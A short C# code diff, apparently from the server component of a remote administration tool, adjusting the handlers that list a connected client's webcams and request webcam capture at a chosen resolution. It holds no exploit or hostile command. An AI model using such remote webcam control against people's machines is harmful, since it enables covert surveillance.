@@ -179,7 +179,7 @@ namespace xServer.Core.Commands
             if (client.Value == null || client.Value.FrmWebcam == null)
                 return;
 
-            client.Value.FrmWebcam.AddWebcams(packet.Names);
+            client.Value.FrmWebcam.AddWebcams(packet.Webcams);
         }
 
         public static void HandleGetWebcamResponse(Client client, GetWebcamResponse packet)
@@ -200,7 +200,7 @@ namespace xServer.Core.Commands
 
             if (client.Value != null && client.Value.FrmWebcam != null && client.Value.FrmWebcam.IsStarted)
             {
-                new GetWebcam(packet.Webcam).Execute(client);
+                new GetWebcam(packet.Webcam, packet.Resolution).Execute(client);
             }
         }
     }
